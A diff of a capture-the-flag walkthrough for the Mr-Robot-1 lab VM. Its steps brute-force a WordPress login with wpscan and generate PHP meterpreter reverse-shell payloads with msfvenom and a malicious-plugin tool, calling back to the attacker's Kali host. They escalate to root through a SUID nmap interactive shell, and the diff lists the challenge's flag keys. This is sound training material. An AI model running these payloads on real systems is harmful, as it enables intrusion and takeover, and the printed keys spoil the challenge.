@@ -66,23 +66,37 @@ Explanation of how the `hydra` command works:
 # Brute-force elliot's password using wpscan #
 * Use `wpscan` instead to brute-force the password for user elliot: run `wpscan --url 10.0.2.5 --usernames elliot --passwords fsocity2.dic`:
 ![](/screenshots/mr-robot-1/wpScanBruteForcePassword.jpg)
-* It took only around half a minute, which is way faster than any attempts using `hydra`.
+* It took only around half a minute to get the password `ER28-0652`, which is way faster than any attempts using `hydra`.
 * Note: If you were to run the same command again, you would get the results almost instantly, i.e. results were very likely to have been cached.
 * Alternate: I tried to run same command using the original wordlist given, just to see how long it takes. It took n minutes:
 
 * Besides the many repetitions in the orginal list, the password is also found somewhere at the end of the file, thus it took quite some time to get it.
-* After logging in as elliot, we are able to login and install as plugin called [File Manager](https://wordpress.org/plugins/wp-file-manager/).
-* Run `msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.153.160 LPORT=4000 -f raw > shell.php` on our Kali VM to generate our payload. The LHOST is the IP address of our Kali VM.
-* The payload is shell.php. Upload it through File Manager, and the file path is htdocs/wp-content/uploads/shell.php.
-* Run `msfconsole` on our Kali VM. Run `use exploit/multi/handler` and `set payload php/meterpreter_reverse_tcp`.
-* Run `set LPORT=4000` and `set LHOST=192.168.153.160` (IP address of our Kali VM).
-* Run `exploit -j -z`. Open our reverse shell on the victim VM, and we will see from our Kali VM terminal that a session has been started.
-* Run `sessions -i 1` then `sysinfo` to confirm that we are running on a Linux machine as detected earlier from our nmap/Zenmap scan.
-* Navigate to our home directory and we find a directory called robot. Enter robot and we find key-2-of-3.txt and password.raw-md5.
+* After logging in as elliot, we find that we are able to see the full panel on the left-hand side of the wp-admin page. To confirm that we have full access to the site, we check `Users`, and find that elliot indeed has administrator privileges.
+* We will install and use the `malicious-wordpress-plugin` by `wetw0rk` [(GitHub link)](https://github.com/wetw0rk/malicious-wordpress-plugin), as we did in [basic-pentesting-1](https://github.com/leegengyu/CTF-Walkthrough/blob/master/basic-pentesting-1.md).
+* Run `python wordpwn.py 10.0.2.15 4000 Y` after cloning the repository, upload `malicious.zip` as a plugin, and then activate it.
+* Next, head to `10.0.2.5/wp-content/plugins/malicous/wetw0rk_maybe.php` on our browser to connect to the reverse shell.
+* Heading back to our Kali terminal, we see that a meterpreter session has been opened.
+* Navigate to our `home` directory and we find a directory called `robot`. Enter robot and we find key-2-of-3.txt and password.raw-md5:
+![](/screenshots/mr-robot-1/robotDirectory.jpg)
 * The key text file cannot be opened by us at the moment because the file is only readable by root, with no other permissions set. However, the password.raw-md5 file can be opened by us.
-* We find the username `robot` and his password hash (`c3fcd3d76192e4007dfb496cca67e13b`) within the password file. Search for the original value behind the MD5 hash on the Google search engine, and we have now got the password (`abcdefghijklmnopqrstuvwxyz`) to robot.
-* To-do: try to login via ssh using robot username and password. Ensure that the IP address of the victim VM is entered correctly.
-* After logging in as robot, we find that we are able to open key-2-of-3.txt.
-* We have to now find the last key, which is in /root. However, even after logging in as robot, we do not have the permission to navigate to /root. We have to do a privilege escalation here, using a badly configured nmap.
+* We find the string `robot:c3fcd3d76192e4007dfb496cca67e13b` within the .raw-md5 file. The string is likely to mean that there is a username `robot` and password MD5 hash pair `c3fcd3d76192e4007dfb496cca67e13b`. 
+* Using an online MD5 cracker page, we find that the password behind the hash is `abcdefghijklmnopqrstuvwxyz`.
+* We can login via the command-line that greeted us when we booted up the vulnerable VM:
+![](/screenshots/mr-robot-1/directLogin.jpg)
+* Alternatively, we can execute `shell`, then get a terminal-shell using `python -c 'import pty; pty.spawn("/bin/bash")'`. After that, run `su robot` to switch user and enter the password we found above.
+* After logging in as robot, we find that we are able to open key-2-of-3.txt, which contains a string `822c73956184f694993bede3eb39f959`.
+* We have to now find the last key, which is likely to be in /root, since the only thing which we have yet to do is to gain root access. However, even after logging in as robot, we do not have the permission to navigate to /root.
+* We will do a privilege escalation here, using a binary which possess root privileges when they are executed (i.e. SUID executables).
+* To search for these binaries, run `find / -user root -perm -4000 -print 2>/dev/null`:
+![](/screenshots/mr-robot-1/suidExecutables.jpg)
+* The commmand will print the files in the `/` directory owned by `root` that have SUID permission bits. Any errors encountered are redirected to `/dev/null`, listing only binaries that `robot` has access permissions.
+* We will use `nmap`, whose version in the vulnerable VM is `3.8.1` (`nmap --version`). Older versions of nmap (2.0.2 to 5.2.1) have an interactive mode that allowed users to execute shell commands.
 * Run `nmap`, `nmap --interactive` and then `!sh` to get a shell. `whoami` shows that we are now `root`.
-* Head to /root and we find key-3-of-3.txt: `04787ddef27c3dee1ee161b21670b4e4`.
+* Head to /root and we find a number of files, amongst which is key-3-of-3.txt: `04787ddef27c3dee1ee161b21670b4e4`.
+![](/screenshots/mr-robot-1/rootDirectory.jpg)
+* There is also a file `firstboot_done`, which probably indicates to us that we are now done with this challenge (now that we have gotten all 3 keys as well)!
+
+# Keys obtained #
+* Key 1: 073403c8a58a1f80d943455fb30724b9
+* Key 2: 822c73956184f694993bede3eb39f959
+* Key 3: 04787ddef27c3dee1ee161b21670b4e4
